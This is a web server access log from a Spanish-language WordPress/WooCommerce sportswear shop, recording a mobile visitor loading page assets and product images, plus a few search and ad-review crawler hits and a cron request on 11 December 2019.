173.252.95.25 - - [11/Dec/2019:06:58:13 +0100] "GET /wp-content/plugins/elementor/assets/css/frontend.min.css?ver=2.5.16 HTTP/1.1" 200 98729 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.2 - - [11/Dec/2019:06:58:13 +0100] "GET /wp-content/uploads/elementor/css/global.css?ver=1559638744 HTTP/1.1" 200 8499 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.2 - - [11/Dec/2019:06:58:14 +0100] "GET /wp-content/uploads/elementor/css/post-16241.css?ver=1562311573 HTTP/1.1" 200 8297 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.25 - - [11/Dec/2019:06:58:14 +0100] "GET /wp-content/themes/shopper/assets/sass/woocommerce/woocommerce.css?ver=5.2.4 HTTP/1.1" 200 86897 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.15 - - [11/Dec/2019:06:58:14 +0100] "GET /wp-content/plugins/smart-slider-3/library/media/smartslider.min.css?1559118093 HTTP/1.1" 200 23322 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.25 - - [11/Dec/2019:06:58:14 +0100] "GET /wp-includes/js/jquery/jquery.js?ver=1.12.4-wp HTTP/1.1" 200 100725 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.30 - - [11/Dec/2019:06:58:15 +0100] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1 HTTP/1.1" 200 13762 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.40 - - [11/Dec/2019:06:58:16 +0100] "GET /wp-content/plugins/cookie-law-info/public/js/cookie-law-info-public.js?ver=1.7.6 HTTP/1.1" 200 20439 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.30 - - [11/Dec/2019:06:58:16 +0100] "GET /wp-content/plugins/wpfront-notification-bar/jquery-plugins/jquery.c.js?ver=1.4.0 HTTP/1.1" 200 6800 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.40 - - [11/Dec/2019:06:58:16 +0100] "GET /wp-content/plugins/wpfront-notification-bar/js/wpfront-notification-bar.js?ver=1.7.1 HTTP/1.1" 200 9025 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.30 - - [11/Dec/2019:06:58:16 +0100] "GET /wp-content/plugins/simple-social-icons/svgxuse.js?ver=1.1.21 HTTP/1.1" 200 12943 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.40 - - [11/Dec/2019:06:58:17 +0100] "GET /wp-content/plugins/smart-slider-3/nextend/media/dist/n2.min.js?1559118093 HTTP/1.1" 200 7199 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.40 - - [11/Dec/2019:06:58:17 +0100] "GET /wp-content/plugins/smart-slider-3/nextend/media/dist/nextend-frontend.min.js?1559118093 HTTP/1.1" 200 89702 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.33 - - [11/Dec/2019:06:58:18 +0100] "GET /wp-content/plugins/smart-slider-3/library/media/dist/smartslider-frontend.min.js?1559118093 HTTP/1.1" 200 130656 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.40 - - [11/Dec/2019:06:58:18 +0100] "GET /wp-content/plugins/smart-slider-3/library/media/plugins/type/simple/simple/dist/smartslider-simple-type-frontend.min.js?1559118093 HTTP/1.1" 200 22336 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:19 +0100] "GET /wp-content/themes/shopper/assets/js/crm.js?ver=1561548510 HTTP/1.1" 200 4237 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.40 - - [11/Dec/2019:06:58:19 +0100] "GET /wp-content/plugins/woocommerce/assets/js/jquery-blockui/jquery.blockUI.min.js?ver=2.70 HTTP/1.1" 200 13271 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.41 - - [11/Dec/2019:06:58:19 +0100] "GET /wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.min.js?ver=3.6.4 HTTP/1.1" 200 6346 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:20 +0100] "GET /wp-content/plugins/elementor/assets/lib/font-awesome/fonts/fontawesome-webfont.woff2?v=4.7.0 HTTP/1.1" 200 80978 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.40 - - [11/Dec/2019:06:58:20 +0100] "GET /wp-content/uploads/2019/05/cropped-asw-white.png HTTP/1.1" 200 10863 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:20 +0100] "GET /wp-content/uploads/2019/07/carpa-1024x771.jpg HTTP/1.1" 200 92688 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.40 - - [11/Dec/2019:06:58:20 +0100] "GET /wp-content/uploads/2019/04/toalla-absorvente-gymnasio-7-300x300.png HTTP/1.1" 200 82027 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.7 - - [11/Dec/2019:06:58:21 +0100] "GET /wp-content/uploads/2019/04/Gorra-sport-12-300x300.png HTTP/1.1" 200 52757 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:21 +0100] "GET /wp-content/uploads/2019/04/bidon-match-4-300x300.png HTTP/1.1" 200 75183 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.27 - - [11/Dec/2019:06:58:21 +0100] "GET /wp-content/themes/shopper/assets/fonts/fontawesome-webfont.woff2?v=4.7.0 HTTP/1.1" 200 80978 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:22 +0100] "GET /wp-content/uploads/2019/04/bolsa-deporte-young-1-300x300.png HTTP/1.1" 200 80698 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.9 - - [11/Dec/2019:06:58:22 +0100] "GET /wp-content/uploads/2019/04/mochila-decath-5-300x300.png HTTP/1.1" 200 67394 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.39 - - [11/Dec/2019:06:58:22 +0100] "GET /wp-content/uploads/2019/04/Llavero-triumph-1-300x300.png HTTP/1.1" 200 16218 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:22 +0100] "GET /wp-content/uploads/2019/04/SA-6684-1-300x300.png HTTP/1.1" 200 98171 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.39 - - [11/Dec/2019:06:58:23 +0100] "GET /wp-content/uploads/2018/06/sa-6502-naranja-300x300.jpg HTTP/1.1" 200 46019 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.9 - - [11/Dec/2019:06:58:23 +0100] "GET /wp-content/uploads/2018/05/cif-g221-2-300x300.jpg HTTP/1.1" 200 11657 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:23 +0100] "GET /wp-content/uploads/2018/05/cp-lycra-2.jpg HTTP/1.1" 200 17138 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.9 - - [11/Dec/2019:06:58:23 +0100] "GET /wp-content/uploads/2018/05/cat-3164-amarillo-300x300.png HTTP/1.1" 200 75773 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.39 - - [11/Dec/2019:06:58:23 +0100] "GET /wp-content/uploads/2017/03/sa-0415_60-300x300.jpg HTTP/1.1" 200 18635 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:25 +0100] "GET /wp-content/plugins/woocommerce/assets/js/frontend/cart-fragments.min.js?ver=3.6.4 HTTP/1.1" 200 6644 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.39 - - [11/Dec/2019:06:58:25 +0100] "GET /wp-content/plugins/woocommerce/assets/js/frontend/woocommerce.min.js?ver=3.6.4 HTTP/1.1" 200 5176 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.9 - - [11/Dec/2019:06:58:25 +0100] "GET /wp-content/plugins/woocommerce/assets/js/js-cookie/js.cookie.min.js?ver=2.1.4 HTTP/1.1" 200 5550 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.39 - - [11/Dec/2019:06:58:26 +0100] "GET /wp-content/themes/shopper/assets/js/woocommerce/header-cart.min.js?ver=1.3.8 HTTP/1.1" 200 4335 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:26 +0100] "GET /wp-content/themes/shopper/assets/js/skip-link-focus-fix.js?ver=1.3.8 HTTP/1.1" 200 4386 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.9 - - [11/Dec/2019:06:58:26 +0100] "GET /wp-content/themes/shopper/assets/js/shopper.min.js?ver=1.3.8 HTTP/1.1" 200 9357 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.39 - - [11/Dec/2019:06:58:26 +0100] "GET /wp-includes/js/wp-embed.min.js?ver=5.2.4 HTTP/1.1" 200 5107 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.9 - - [11/Dec/2019:06:58:26 +0100] "GET /wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=2.5.16 HTTP/1.1" 200 14849 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:26 +0100] "GET /wp-content/plugins/elementor/assets/lib/slick/slick.min.js?ver=1.8.1 HTTP/1.1" 200 46627 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.9 - - [11/Dec/2019:06:58:27 +0100] "GET /wp-content/plugins/elementor/assets/lib/dialog/dialog.min.js?ver=4.7.1 HTTP/1.1" 200 14274 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.39 - - [11/Dec/2019:06:58:27 +0100] "GET /wp-includes/js/jquery/ui/position.min.js?ver=1.11.4 HTTP/1.1" 200 10232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:27 +0100] "GET /wp-content/plugins/elementor/assets/lib/waypoints/waypoints.min.js?ver=4.0.2 HTTP/1.1" 200 15904 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.9 - - [11/Dec/2019:06:58:27 +0100] "GET /wp-content/plugins/elementor/assets/lib/swiper/swiper.min.js?ver=4.4.6 HTTP/1.1" 200 129489 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.40 - - [11/Dec/2019:06:58:28 +0100] "GET /wp-content/plugins/elementor/assets/js/frontend.min.js?ver=2.5.16 HTTP/1.1" 200 44704 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:28 +0100] "GET /wp-includes/js/jquery/ui/core.min.js?ver=1.11.4 HTTP/1.1" 200 7704 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:28 +0100] "GET /wp-content/plugins/si-contact-form/includes/fscf-scripts.js?ver=179 HTTP/1.1" 200 4396 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.40 - - [11/Dec/2019:06:58:28 +0100] "GET /wp-includes/js/wp-emoji-release.min.js?ver=5.2.4 HTTP/1.1" 200 17546 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.9 - - [11/Dec/2019:06:58:28 +0100] "GET /wp-content/uploads/2019/07/buff-bandana-300x123.jpg HTTP/1.1" 200 19222 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.40 - - [11/Dec/2019:06:58:30 +0100] "GET /wp-content/uploads/2019/07/camiseta-tecnica-mujer-300x124.jpg HTTP/1.1" 200 20683 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:30 +0100] "GET /wp-content/uploads/2019/07/slider1.jpg HTTP/1.1" 200 247936 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.39 - - [11/Dec/2019:06:58:30 +0100] "GET /wp-content/uploads/2019/07/slider2.jpg HTTP/1.1" 200 253582 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.40 - - [11/Dec/2019:06:58:30 +0100] "GET /wp-content/uploads/2019/07/slider3.jpg HTTP/1.1" 200 280344 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.9 - - [11/Dec/2019:06:58:29 +0100] "POST /?wc-ajax=get_refreshed_fragments HTTP/1.1" 200 4708 "https://amazingsportwear.com/?fbclid=IwAR2ZxhRaG6IP7jm00N_tbgfnaqISTVN40DDF9POik0KZ1CRfINoxdmIavQI" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:31 +0100] "GET /wp-content/uploads/2019/07/camiseta-tecnica-unisex-300x124.jpg HTTP/1.1" 200 20453 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.39 - - [11/Dec/2019:06:58:31 +0100] "GET /wp-content/uploads/2019/07/slider4.jpg HTTP/1.1" 200 373113 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.40 - - [11/Dec/2019:06:58:31 +0100] "GET /wp-content/uploads/2019/07/cortavientos-300x124.jpg HTTP/1.1" 200 20457 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:31 +0100] "GET /wp-content/uploads/2019/07/gorra-tecnica-300x124.jpg HTTP/1.1" 200 20207 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.39 - - [11/Dec/2019:06:58:32 +0100] "GET /wp-content/uploads/2019/07/mochila-saco-300x124.jpg HTTP/1.1" 200 20335 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.40 - - [11/Dec/2019:06:58:32 +0100] "GET /wp-content/uploads/2019/07/polo-tecnico-300x124.jpg HTTP/1.1" 200 20902 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:32 +0100] "GET /wp-content/uploads/2019/07/toalla-300x124.jpg HTTP/1.1" 200 20320 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.39 - - [11/Dec/2019:06:58:32 +0100] "GET /wp-content/uploads/2019/07/zapatillero-300x124.jpg HTTP/1.1" 200 19962 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.40 - - [11/Dec/2019:06:58:33 +0100] "GET /wp-content/uploads/2019/06/amistad3-300x300.jpg HTTP/1.1" 200 16107 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:33 +0100] "GET /wp-content/uploads/2019/06/compartir-300x300.jpg HTTP/1.1" 200 13503 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.29 - - [11/Dec/2019:06:58:33 +0100] "GET /wp-content/uploads/2019/05/asw-white-300x126.png HTTP/1.1" 200 15424 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1"
173.252.95.42 - - [11/Dec/2019:06:58:34 +0100] "GET /wp-content/plugins/simple-social-icons/symbol-defs.svg HTTP/1.1" 200 23062 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1; _ga=GA1.2.871033642.1576043914; _gid=GA1.2.1485803363.1576043914; _gat_gtag_UA_91619287_1=1"
173.252.95.4 - - [11/Dec/2019:06:58:34 +0100] "GET /wp-content/plugins/wpfront-notification-bar/images/arrow_down.png HTTP/1.1" 200 5925 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1; _ga=GA1.2.871033642.1576043914; _gid=GA1.2.1485803363.1576043914; _gat_gtag_UA_91619287_1=1"
173.252.95.30 - - [11/Dec/2019:06:58:37 +0100] "GET /wp-content/uploads/2019/05/cropped-favicon-nuevo-logo-amazinf-128px-32x32.png HTTP/1.1" 200 4587 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" "wpfront-notification-bar-landingpage=1; _ga=GA1.2.871033642.1576043914; _gid=GA1.2.1485803363.1576043914; _gat_gtag_UA_91619287_1=1"
157.55.39.21 - - [11/Dec/2019:06:58:50 +0100] "GET /robots.txt HTTP/1.1" 200 2297 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.21 - - [11/Dec/2019:06:58:53 +0100] "GET /robots.txt HTTP/1.1" 200 3939 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
31.13.127.19 - - [11/Dec/2019:06:58:59 +0100] "GET /wp-content/uploads/2019/07/zapatillero-300x124.jpg HTTP/1.1" 200 19710 "-" "adreview/1.0" "-"
31.13.127.6 - - [11/Dec/2019:06:58:59 +0100] "GET /wp-content/uploads/2019/07/zapatillero-300x124.jpg HTTP/1.1" 200 19962 "-" "cortex/1.0" "-"
31.13.127.16 - - [11/Dec/2019:06:59:00 +0100] "GET /wp-content/uploads/2019/07/zapatillero-300x124.jpg HTTP/1.1" 200 19962 "-" "cortex/1.0" "-"
217.76.130.90 - - [11/Dec/2019:06:59:08 +0100] "POST /wp-cron.php?doing_wp_cron=1576043948.7921030521392822265625 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576043948.7921030521392822265625" "WordPress/5.2.4; https://amazingsportwear.com" "-"
